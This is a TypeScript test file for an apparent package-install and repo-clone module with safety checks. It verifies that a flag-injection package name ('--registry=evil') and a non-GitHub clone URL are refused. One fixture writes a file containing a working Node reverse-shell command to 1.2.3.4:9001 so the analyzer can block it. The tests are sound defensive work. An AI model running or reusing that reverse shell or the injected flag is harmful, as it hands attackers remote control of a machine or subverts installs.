import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { acquirePackage, acquireRepo, type CmdRunner } from "./install.js";

const ok: CmdRunner = () => ({ code: 0, out: "found 0 vulnerabilities" });

test("acquirePackage: installs a safe name, refuses an unsafe one", () => {
  const good = acquirePackage("npm", "left-pad", ok, mkdtempSync(join(tmpdir(), "t-")));
  assert.equal(good.installed, true);
  assert.match(good.report, /installed left-pad/);
  assert.match(good.report, /audit:/);

  const bad = acquirePackage("npm", "--registry=evil", ok, mkdtempSync(join(tmpdir(), "t-")));
  assert.equal(bad.installed, false); // leading dash → flag injection, refused before running
  assert.match(bad.report, /unsafe package name/);
});

test("acquirePackage: install failure is surfaced, not swallowed", () => {
  const fail: CmdRunner = (_c, args) => (args.includes("install") ? { code: 1, out: "E404 not found" } : { code: 0, out: "" });
  const res = acquirePackage("pip", "nonexistent-xyz", fail, mkdtempSync(join(tmpdir(), "t-")));
  assert.equal(res.installed, false);
  assert.match(res.report, /install failed/);
});

test("acquireRepo: refuses a non-github URL before cloning", () => {
  let ran = false;
  const spy: CmdRunner = () => ((ran = true), { code: 0, out: "" });
  const res = acquireRepo("https://evil.example.com/x/y", spy);
  assert.equal(res.blocked, true);
  assert.equal(ran, false); // never shelled out
});

test("acquireRepo: clones then blocks when the analyzer finds a blocker", () => {
  const dir = mkdtempSync(join(tmpdir(), "clone-"));
  // fake clone: drop a malicious file into the scratch dir, then let the REAL analyzer judge it
  const fakeClone: CmdRunner = (_c, _a, cwd) => (writeFileSync(join(cwd, "evil.js"), "require('child_process').exec('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1')"), { code: 0, out: "" });
  const res = acquireRepo("https://github.com/owner/repo", fakeClone, undefined, dir);
  assert.equal(res.cloned, true);
  assert.equal(res.blocked, true);
  assert.match(res.report, /BLOCKED/);
});

test("acquireRepo: a clean repo passes (not blocked)", () => {
  const dir = mkdtempSync(join(tmpdir(), "clone-"));
  const fakeClone: CmdRunner = (_c, _a, cwd) => (writeFileSync(join(cwd, "index.js"), "export const add = (a, b) => a + b;"), { code: 0, out: "" });
  const res = acquireRepo("https://github.com/owner/repo.git", fakeClone, undefined, dir);
  assert.equal(res.cloned, true);
  assert.equal(res.blocked, false);
});
